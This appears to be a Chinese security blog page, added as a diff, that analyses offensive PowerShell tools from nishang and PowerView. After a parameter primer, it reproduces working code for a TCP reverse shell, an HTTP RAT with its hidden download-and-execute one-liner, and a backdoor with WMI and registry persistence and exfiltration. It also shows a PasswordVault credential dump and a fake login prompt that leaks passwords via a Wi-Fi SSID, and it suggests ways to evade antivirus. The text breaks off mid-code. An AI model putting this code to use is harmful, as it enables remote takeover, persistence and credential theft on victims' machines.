@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>powershell脚本的分析 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "powershell\u811a\u672c\u7684\u5206\u6790", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u7b51\u57fa", url: "#_2" },
+              {title: "nishang", url: "#nishang" },
+              {title: "powerview", url: "#powerview" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/" class="btn btn-xs btn-link">
+        渗透路径&沉淀
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        Mimikatz分析
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="powershell">powershell脚本的分析</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#筑基">筑基</a><ul>
+<li><a href="#CmdletBinding">CmdletBinding</a></li>
+<li><a href="#参数集">参数集</a></li>
+</ul>
+</li>
+<li><a href="#nishang">nishang</a><ul>
+<li><a href="#Shells">Shells</a><ul>
+<li><a href="#Invoke-powershelltcp">Invoke-powershelltcp</a></li>
+<li><a href="#Invoke-PoshRatHttp">Invoke-PoshRatHttp</a></li>
+</ul>
+</li>
+<li><a href="#backdoor">backdoor</a><ul>
+<li><a href="#Http-Backdoor">Http-Backdoor</a></li>
+</ul>
+</li>
+<li><a href="#Gather">Gather</a><ul>
+<li><a href="#Get-WebCredentials">Get-WebCredentials</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#powerview">powerview</a><ul>
+<li><a href="#Get-NetSession">Get-NetSession</a><ul>
+<li><a href="#参数">参数</a></li>
+<li><a href="#具体逻辑">具体逻辑</a></li>
+</ul>
+</li>
+<li><a href="#Get-NetLoggedon">Get-NetLoggedon</a><ul>
+<li><a href="#具体逻辑">具体逻辑</a></li>
+</ul>
+</li>
+<li><a href="#Find-DomainUserLocation">Find-DomainUserLocation</a><ul>
+<li><a href="#具体逻辑">具体逻辑</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="_2">筑基</h2>
+<h3 id="cmdletbinding">CmdletBinding</h3>
+<p>CmdletBinding 往往出现在ps中一个函数的开头，用于参数处理。</p>
+<p>一般来说，一个ps函数是这样来设置参数的。（当然也可以用最朴实的 function foo($a,$b,\$c) 来实现参数）</p>
+<pre><code class="language-纯文本">function Get-Version{
+    param (
+        $ComputerName
+    )
+
+    Write-Output $ComputerName
+}
+</code></pre>
+<p>意思就是接收ComputerName参数，输出ComputerName参数。</p>
+<pre><code class="language-纯文本">Get-Version -ComputerName aa
+&gt;aa
+</code></pre>
+<p>我们可以通过Get-Command指令来看此函数支持哪些参数。</p>
+<pre><code class="language-纯文本">PS C:\Users\14216\Desktop&gt; (Get-Command -name Get-Version).Parameters.Keys
+ComputerName
+</code></pre>
+<p>发现它只支持ComputerName参数，因为我们在param中只设置了ComputerName参数。</p>
+<p>但是powershell中是存在有许多通用参数(CommonParameters)的。
+通用参数如 -verbose(显示命令所执行操作的详细信息)，-debug(显示有关命令完成的操作的程序员级详细信息)等。
+像上面那样定义函数参数，是不能让函数接收通用参数的，想要接收通用参数，只需在param前加上  [CmdletBinding()]即可，如下</p>
+<pre><code class="language-纯文本">function Get-Version{
+  [CmdletBinding()]
+    param (
+        $ComputerName
+    )
+
+    Write-Output $ComputerName
+}
+</code></pre>
+<p>此时该函数就变成了“高级函数”，我们再通过Get-Command参数即可看出它支持了通用参数</p>
+<pre><code class="language-纯文本">PS C:\Users\14216\Desktop&gt; (Get-Command -name Get-Version).Parameters.Keys
+ComputerName
+Verbose
+Debug
+ErrorAction
+WarningAction
+InformationAction
+ErrorVariable
+WarningVariable
+InformationVariable
+OutVariable
+OutBuffer
+PipelineVariable
+</code></pre>
+<h3 id="_3">参数集</h3>
+<p>通过为函数设置参数集，可以使函数在不同场景下执行不同的操作。</p>
+<p>要创建参数集，您必须为参数集中的每个参数指定<strong>Parameter</strong>属性的<code>ParameterSetName</code>关键字。对于属于多个参数集的<strong>参数，</strong> 为每个参数集添加一个<strong>Parameter</strong>属性。没有指定参数集名称的参数属于所有参数集。</p>
+<p>这里选取微软官方给出的例子.</p>
+<p>DefaultParameterSetName 指定默认采用的参数集</p>
+<p>Mandatory  指定这个参数在此参数集中是否为强制的</p>
+<p>ParameterSetName  指定参数所属参数集</p>
+<pre><code class="language-纯文本">[CmdletBinding(DefaultParameterSetName = 'Path')]
+    param (
+        [Parameter(Mandatory = $true,
+            ParameterSetName = 'Path',
+            HelpMessage = 'Enter one or more filenames',
+            Position = 0)]
+        [Parameter(Mandatory = $true,
+            ParameterSetName = 'PathAll',
+            Position = 0)]
+        [string[]]$Path,
+
+        [Parameter(Mandatory = $true, ParameterSetName = 'LiteralPathAll')]
+        [Parameter(Mandatory = $true,
+            ParameterSetName = 'LiteralPath',
+            HelpMessage = 'Enter a single filename',
+            ValueFromPipeline = $true)]
+        [string]$LiteralPath,
+
+        [Parameter(ParameterSetName = 'Path')]
+        [Parameter(ParameterSetName = 'LiteralPath')]
+        [switch]$Lines,
+
+        [Parameter(ParameterSetName = 'Path')]
+        [Parameter(ParameterSetName = 'LiteralPath')]
+        [switch]$Words,
+
+        [Parameter(ParameterSetName = 'Path')]
+        [Parameter(ParameterSetName = 'LiteralPath')]
+        [switch]$Characters,
+
+        [Parameter(Mandatory = $true, ParameterSetName = 'PathAll')]
+        [Parameter(Mandatory = $true, ParameterSetName = 'LiteralPathAll')]
+        [switch]$All,
+
+        [Parameter(ParameterSetName = 'Path')]
+        [Parameter(ParameterSetName = 'PathAll')]
+        [switch]$Recurse
+    )
+</code></pre>
+<h2 id="nishang">nishang</h2>
+<h3 id="shells">Shells</h3>
+<p>Shells模块主要是用来弹shell的。</p>
+<h4 id="invoke-powershelltcp">Invoke-powershelltcp</h4>
+<p>这个function的作用是，通过tcp进行连shell操作。</p>
+<pre><code class="language-纯文本">正连shell  Invoke-powershelltcp -bind -port 10086
+反弹shell  Invoke-powershelltcp -reverse -ipaddress 123.123.123.123 -port 10086
+</code></pre>
+<p>** 参数 **</p>
+<pre><code class="language-纯文本">    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName=&quot;reverse&quot;)]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName=&quot;bind&quot;)]
+        [Switch]
+        $Bind
+
+    )
+</code></pre>
+<p>可以很轻松发现有两个参数集分别对应监听反弹shell和直接反弹shell。</p>
+<p><strong>具体逻辑</strong></p>
+<p>在代码逻辑开端，先通过参数判断自身行为是反弹还是监听。
+如果是反弹shell，则与指定IP端口进行链接。System.Net.Sockets.TCPClient：<a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-5.0" title="https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-5.0">https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-5.0</a>
+如果是正连shell，则于指定端口开启监听并等待链接。System.Net.Sockets.TcpListenerhttps\://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcplistener?view=net-5.0</p>
+<pre><code class="language-纯文本">        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        #Bind to the provided port if Bind switch is used.
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+</code></pre>
+<p>在获取连接后，获取TcpClient的stream流用于读写数据。然后通过stream流发送起始的信息。</p>
+<pre><code class="language-纯文本">        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0} //获取一个长度为65535被0填充的字节数据，用于后来的TCP数据交换 
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+</code></pre>
+<p>随后便是处理消息传递与命令执行</p>
+<pre><code class="language-纯文本">while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) //监听链接传来的讯息
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)  //$data为远程传来的信息，一般为命令
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String ) //此变量存储命令执行的结果
+            }
+            catch
+            {
+                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '
+            $x = ($error[0] | Out-String) //错误信息
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            #Return the results
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length) //返回信息
+            $stream.Flush()  
+        }
+</code></pre>
+<p><strong>怎样优化？</strong></p>
+<p>可以对流量进行一步优化：对stream中的IO套用加解密，一方面是给信息传回套加密，另一方面是给指令发放套加密（这一步需要控制端额外编写加密指令发送工具）</p>
+<h4 id="invoke-poshrathttp">Invoke-PoshRatHttp</h4>
+<p>Invoke-PoshRatHttp是一个基于HTTP的弹shell工具</p>
+<p>它的大致逻辑为：1.本地监听端口，生成一段powershell远程加载指令 2.在目标机器上执行powershell远程加载指令，使其执行另一个URL上HTTP传回的命令，并通过POST向此URL传回命令执行结果</p>
+<p>官方描述(此脚本还可通过hta执行命令，不过本文就不赘述了)</p>
+<pre><code class="language-纯文本">This script starts a listener on the attacker's machine. The listener needs a port to listen.
+
+On the target machine execute the below command from PowerShell:
+iex (New-Object Net.WebClient).DownloadString(&quot;http://ListenerIPAddress/connect&quot;)
+
+or trick a user in connecting to: http://ListenerIPAddress/WindowsDefender.hta
+
+The listener opens incoming traffic on the specified port by the name of &quot;Windows Update HTTP&quot;. The listener needs to be run from
+an elevated PowerShell session.
+
+The script has been originally written by Casey Smith (@subTee)
+</code></pre>
+<p><strong>参数</strong></p>
+<p>参数部分没什么说的，就是指定本地IP与端口而已</p>
+<pre><code class="language-纯文本">    [CmdletBinding()] Param(
+
+        [Parameter(Position = 0, Mandatory = $true)]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [Int]
+        $Port
+    )
+</code></pre>
+<p><strong>具体逻辑</strong></p>
+<p>脚本开始运行后会监听本地端口，并根据传入的ipaddress和port生成powershell一句话指令，执行该指令会使用户执行远程URL得到的payload</p>
+<pre><code class="language-纯文本">$listener = New-Object System.Net.HttpListener
+        $listener.Prefixes.Add(&quot;http://+:$Port/&quot;)
+
+        #Create Firewall Rules
+        netsh advfirewall firewall delete rule name=&quot;WindowsUpdate HTTP&quot; | Out-Null
+        netsh advfirewall firewall add rule name=&quot;WindowsUpdate HTTP&quot; dir=in action=allow protocol=TCP localport=$Port | Out-Null
+
+        $listener.Start()
+        Write-Output &quot;Listening on $IPAddress`:$Port&quot;
+        Write-Output &quot;Run the following command on the target:&quot;
+        Write-Output &quot;powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://$IPAddress`:$Port/connect'))&quot;
+</code></pre>
+<p>随后通过一个大的while循环监听对此端口发送的HTTP请求。
+在其中，如果监听到以connect结尾的GET请求，则生成一段payload，并在最后HTTP应答回去。（IEX ((New-Object Net.WebClient).DownloadString 是以GET请求工作的）
+在受害者执行http\://.../connect得到的脚本后，便会执行http\://.../rat传来的PAYLOAD，在受害机执行了http\://.../rat 传回payload后，会通过uploadString方法以POST方式将执行结果传回http\://../rat</p>
+<pre><code class="language-纯文本">          if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq &quot;GET&quot;)) 
+            {  
+
+            $message = &quot;
+
+                            `$s = `&quot;http://$IPAddress`:$Port/rat`&quot;
+                  `$w = New-Object Net.WebClient 
+                  while(`$true)
+                  {
+                  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
+                  `$r = `$w.DownloadString(`$s)
+                  while(`$r) {
+                    `$o = invoke-expression `$r | out-string 
+                    `$w.UploadString(`$s, `$o)  
+                    break
+                  }
+                  }
+            &quot;
+            }  
+            ......
+            [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+            $response.ContentLength64 = $buffer.length
+            $output = $response.OutputStream
+            $output.Write($buffer, 0, $buffer.length)
+            $output.Close()
+</code></pre>
+<p><a href="http://.../rat" title="http://.../rat">http://.../rat</a> 的相关逻辑是这么写的
+当http\://.../rat 被以GET方法访问后，攻击机会等待终端的输入，然后将其作为HTTP应答传回。
+当http\://.../rat 被以POST方法访问后，攻击机则会获取该请求并把请求内容输出到终端。（也就是说会把命令执行结果返回到终端)</p>
+<pre><code class="language-纯文本">            if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq &quot;POST&quot;) )
+            { 
+            Receive-Request($request)  
+          }
+
+            if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq &quot;GET&quot;)) 
+            {  
+                $response.ContentType = 'text/plain'
+                $message = Read-Host &quot;PS $hostip&gt;&quot;    
+                #If the Server/Attacker uses the exit command. Close the client part and the server.
+                if ($message -eq &quot;exit&quot;)
+                {
+                    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+                    $response.ContentLength64 = $buffer.length
+                    $output = $response.OutputStream
+                    $output.Write($buffer, 0, $buffer.length)
+                    $output.Close()
+                    $listener.Stop()
+                    break
+                }
+            }
+            ····            
+            [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+            $response.ContentLength64 = $buffer.length
+            $output = $response.OutputStream
+            $output.Write($buffer, 0, $buffer.length)
+            $output.Close()
+</code></pre>
+<p><strong>怎么优化？</strong></p>
+<p>powershell远程脚本免杀要做好，不然根本不可能过AV
+IO套加密</p>
+<h3 id="backdoor">backdoor</h3>
+<h4 id="http-backdoor">Http-Backdoor</h4>
+<p>Http-Backdoor是一个基于HTTP的后门程序。
+它的大致逻辑是定时访问特定URL（targeturl）若URL返回特定值则从另一个指定URL（payloadurl）下载payload文件并执行。</p>
+<p><strong>参数</strong></p>
+<pre><code class="language-纯文本">    [CmdletBinding(DefaultParameterSetName=&quot;noexfil&quot;)] Param(
+        [Parameter(Parametersetname=&quot;exfil&quot;)]
+        [Switch]
+        $persist, //是否做持久化
+
+        [Parameter(Parametersetname=&quot;exfil&quot;)]
+        [Switch]
+        $exfil, //是否数据回显
+
+        [Parameter(Position = 0, Mandatory = $True, Parametersetname=&quot;exfil&quot;)]
+        [Parameter(Position = 0, Mandatory = $True, Parametersetname=&quot;noexfil&quot;)]
+        [String]
+        $CheckURL, //从哪个URL检测开始标志和结束标志
+
+        [Parameter(Position = 1, Mandatory = $True, Parametersetname=&quot;exfil&quot;)]
+        [Parameter(Position = 1, Mandatory = $True, Parametersetname=&quot;noexfil&quot;)]
+        [String]
+        $PayloadURL, //从哪个URL下载PAYLOAD
+
+        [Parameter(Position = 2, Mandatory = $False, Parametersetname=&quot;exfil&quot;)]
+        [Parameter(Position = 2, Mandatory = $False, Parametersetname=&quot;noexfil&quot;)]
+        [String]
+        $Arguments = &quot;Out-Null&quot;,  //额外的附加指令，会在木马工作时运行
+
+        [Parameter(Position = 3, Mandatory = $True, Parametersetname=&quot;exfil&quot;)]
+        [Parameter(Position = 3, Mandatory = $True, Parametersetname=&quot;noexfil&quot;)]
+        [String]
+        $MagicString, //从targeturl获取到该标志后从PayloadUrl下载payload执行
+
+        [Parameter(Position = 4, Mandatory = $True, Parametersetname=&quot;exfil&quot;)]
+        [Parameter(Position = 4, Mandatory = $True, Parametersetname=&quot;noexfil&quot;)]
+        [String]
+        $StopString, //从targeturl获取到该标志后结束后门工作
+
+
+        [Parameter(Position = 5, Mandatory = $False, Parametersetname=&quot;exfil&quot;)] [ValidateSet(&quot;gmail&quot;,&quot;pastebin&quot;,&quot;WebServer&quot;,&quot;DNS&quot;)]
+        [String]
+        $ExfilOption,  //数据回显的方式
+//以下参数为数据回显的一些参数
+        [Parameter(Position = 6, Mandatory = $False, Parametersetname=&quot;exfil&quot;)] 
+        [String]
+        $dev_key = &quot;null&quot;,
+
+        [Parameter(Position = 7, Mandatory = $False, Parametersetname=&quot;exfil&quot;)]
+        [String]
+        $username = &quot;null&quot;,
+
+        [Parameter(Position = 8, Mandatory = $False, Parametersetname=&quot;exfil&quot;)]
+        [String]
+        $password = &quot;null&quot;,
+
+        [Parameter(Position = 9, Mandatory = $False, Parametersetname=&quot;exfil&quot;)]
+        [String]
+        $URL = &quot;null&quot;,
+
+        [Parameter(Position = 10, Mandatory = $False, Parametersetname=&quot;exfil&quot;)]
+        [String]
+        $DomainName = &quot;null&quot;,
+
+        [Parameter(Position = 11, Mandatory = $False, Parametersetname=&quot;exfil&quot;)]
+        [String]
+        $AuthNS = &quot;null&quot;   
+
+   )
+</code></pre>
+<p>参数还是有很多的，但只对应两个参数集exfil（有数据回显），和noexfil（无数据回显）</p>
+<p><strong>具体逻辑</strong></p>
+<p>在代码主体的开始，定义了两个变量（$body和$exfiltration）以字符串形式存放后门本体函数（HTTP-Backdoor-Logic）和后门数据带出函数（Do-Exfiltration-HTTP），我们稍后来分析他们俩。</p>
+<p>可以看到在代码开始运行时，会检测是否有persist参数，进而决定是否做持久化工作，持久化的相关代码我们稍后讨论。
+先来看persist为flase时，会因exfil参数是否存在而分情况定义一个字符串变量$options，写入 调用木马的 代码。
+随后将HTTP-Backdoor-Logic（对应$body）和Do-Exfiltration-HTTP（对应$exfiltration）以及调用木马的代码$options 写入一个文件，并执行。</p>
+<pre><code class="language-纯文本">    $modulename = &quot;HTTP-Backdoor.ps1&quot;
+    if($persist -eq $True)
+    {
+        //持久化工作，我们稍后来讨论此处
+    else
+    {
+        $options = &quot;HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString&quot;
+        if ($exfil -eq $True)
+        {
+            $options = &quot;HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil&quot;
+        }
+        if(1 -eq 1){
+
+        }
+        Out-File -InputObject $body -Force $env:TEMP\$modulename
+        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
+        Out-File -InputObject $options -Append $env:TEMP\$modulename
+        Invoke-Expression $env:TEMP\$modulename
+    }
+}
+</code></pre>
+<p>随后我们再来看看\$body 中的内容</p>
+<p>首先是一个大的while true循环，然后便是定时获取CheckUrl上的内容，若CheckURL上的内容与MagicString 一致，则从PayloadUrl处下载payload执行。
+随后执行$Arguments参数指定的命令，再然后判定$exfil参数是否存在而是否做出数据外带行为。
+然后进入60s的休眠，若获取CheckUrl上的内容为StopString则停止运行程序。</p>
+<pre><code class="language-纯文本">$body = @'
+function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil) 
+{
+    while($true)
+    {
+    $exec = 0
+    start-sleep -seconds 5
+    $webclient = New-Object System.Net.WebClient
+    $filecontent = $webclient.DownloadString(&quot;$CheckURL&quot;)
+    $filecontent = $filecontent.TrimEnd()
+    if($filecontent -eq $MagicString)
+    {
+
+        $script:pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
+        # Check for arguments to the downloaded script.
+        if ($Arguments -ne &quot;Out-Null&quot;)
+        {
+            $pastevalue = Invoke-Expression $Arguments                   
+        }
+        $pastevalue
+        $exec++
+        if ($exfil -eq $True)
+        {
+           $pastename = $env:COMPUTERNAME + &quot; Results of HTTP Backdoor: &quot;
+           Do-Exfiltration-HTTP &quot;$pastename&quot; &quot;$pastevalue&quot; &quot;$ExfilOption&quot; &quot;$dev_key&quot; &quot;$username&quot; &quot;$password&quot; &quot;$URL&quot; &quot;$DomainName&quot; &quot;$AuthNS&quot;
+        }
+        if ($exec -eq 1)
+        {
+            Start-Sleep -Seconds 60
+        }
+    }
+    elseif ($filecontent -eq $StopString)
+    {
+        break
+    }
+    }
+}
+'@
+</code></pre>
+<p>关于数据外带的Do-Exfiltration-HTTP方法实际上并没有什么好说的，它主要采用了三种外带方法：
+1·通过公共系统，采用特定API传回数据，如通过gmail发邮箱以及pastebin（用来在线存储文本的网站）
+2·通过POST方法向指定URL发包传参
+3·DNS外带</p>
+<p>我们再来看看它做的持久化吧。
+逻辑也很简单，大体就是先把后门本体写入到一个文件后，创建一个调用后门的VBS脚本
+然后判断当前用户身份，如果是Administrator则通过WMI绑定VBS脚本留后门（过滤器监听用户登录）
+不是administrator就向注册表把VBS写入开机项。</p>
+<pre><code class="language-纯文本">$name = &quot;persist.vbs&quot;
+        $options = &quot;HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString&quot;
+        if ($exfil -eq $True)
+        {
+            $options = &quot;HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil&quot;
+        }
+        Out-File -InputObject $body -Force $env:TEMP\$modulename
+        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
+        Out-File -InputObject $options -Append $env:TEMP\$modulename
+        echo &quot;Set objShell = CreateObject(`&quot;Wscript.shell`&quot;)&quot; &gt; $env:TEMP\$name
+        echo &quot;objShell.run(`&quot;powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`&quot;)&quot; &gt;&gt; $env:TEMP\$name
+        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
+        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
+        {
+            $scriptpath = $env:TEMP
+            $scriptFileName = &quot;$scriptpath\$name&quot;
+            $filterNS = &quot;root\cimv2&quot;
+            $wmiNS = &quot;root\subscription&quot;
+            $query = @&quot;
+             Select * from __InstanceCreationEvent within 30 
+             where targetInstance isa 'Win32_LogonSession' 
+&quot;@
+            $filterName = &quot;WindowsSanity&quot;
+            $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage=&quot;WQL&quot;; Query=$query}
+            $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name=&quot;WindowsSanity&quot;; ScriptFileName=$scriptFileName; ScriptingEngine=&quot;VBScript&quot;}
+            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
+                    }
+        else
+        {
+            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
+            echo &quot;Set objShell = CreateObject(`&quot;Wscript.shell`&quot;)&quot; &gt; $env:TEMP\$name
+            echo &quot;objShell.run(`&quot;powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`&quot;)&quot; &gt;&gt; $env:TEMP\$name
+        }
+    }
+</code></pre>
+<p><strong>怎么优化</strong></p>
+<p>IO加密</p>
+<h3 id="gather">Gather</h3>
+<h4 id="get-webcredentials">Get-WebCredentials</h4>
+<p>此脚本用于收集网站用户密码，很短，但是其收集密码的方式作为菜鸡的我还是第一次见。</p>
+<p><strong>参数</strong></p>
+<p>没有参数</p>
+<p><strong>具体逻辑</strong></p>
+<p>Windows.Security.Credentials.PasswordVault 是一个记录应用和服务凭证的class。
+我们只需要对其进行简单的遍历输出，便可以得到一些凭证。</p>
+<pre><code class="language-纯文本">$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] //这一段可以不要
+$VaultObj = new-object Windows.Security.Credentials.PasswordVault
+$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
+</code></pre>
+<p><img alt="image-20210817144421368" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210817144421368.png" title="image-20210817144421368" /></p>
+<p><strong>Invoke-SSIDEXfil</strong></p>
+<p>这个脚本运行后会弹出一个登录框要求用户输入正确的密码账户，若不正确还会一直弹框。最后把正确的密码账户通过SSID外带出来。
+这里我对它怎么外带数据不太感兴趣，我更感兴趣的是那个弹登录框以及验证凭证的操作。</p>
+<p><img alt="image-20210817155542821" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210817155542821.png" title="image-20210817155542821" /></p>
+<p><strong>体逻辑（登录框）</strong></p>
+<p>关于登录框对凭据的验证是这么个逻辑：</p>
+<p>1.若是非域用户，则创建一个基于计算机的用户主体（封装了帐户数据和操作共同所有安全主体。这是所有安全主体的抽象基类），并向用户主体传入凭证进行验证
+2.若是域用户，则通过传入的域，用户名，密码来实例化一个<a href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry.-ctor?view=dotnet-plat-ext-5.0#System_DirectoryServices_DirectoryEntry__ctor" title="DirectoryEntry">DirectoryEntry</a>来达到验证凭证正确性的目的</p>
+<pre><code class="language-纯文本">    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
+    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+    $domainDN = &quot;LDAP://&quot; + ([ADSI]&quot;&quot;).distinguishedName
+    .....
+
+        while($true)
+        {
+            #Displaying a forged login prompt to the user.
+            $credential = $host.ui.PromptForCredential(&quot;Credentials are required to perform this operation&quot;, &quot;Please enter your user name and password.&quot;, &quot;&quot;, &quot;&quot;) //这句负责设置登陆框提示信息和标题
+            if($credential)
+            {
+                $creds = $credential.GetNetworkCredential()
+                [String]$user = $creds.username
+                [String]$pass = $creds.password
+                [String]$domain = $creds.domain
+
+                #Check for validity of credentials locally and with domain.
+                $authlocal = $DS.ValidateCredentials($user, $pass)
+                $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
+                if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
+                {
+
+                    $output = $authdomain.name + &quot;:&quot; + $user + &quot;:&quot; + $pass       
+                    $ssidname = ConvertTo-ROT13 -rot13string $output
+
+                    Write-Verbose &quot;Setting the hosted network SSID to $ssidname in the form Domain:Username:Password.&quot;
+                    netsh wlan set hostednetwork mode=allow ssid=`&quot;$ssidname`&quot; key='HardtoGuess!@#123'
+                    Write-Verbose &quot;Startig the hosted network SSID $ssidname.&quot;
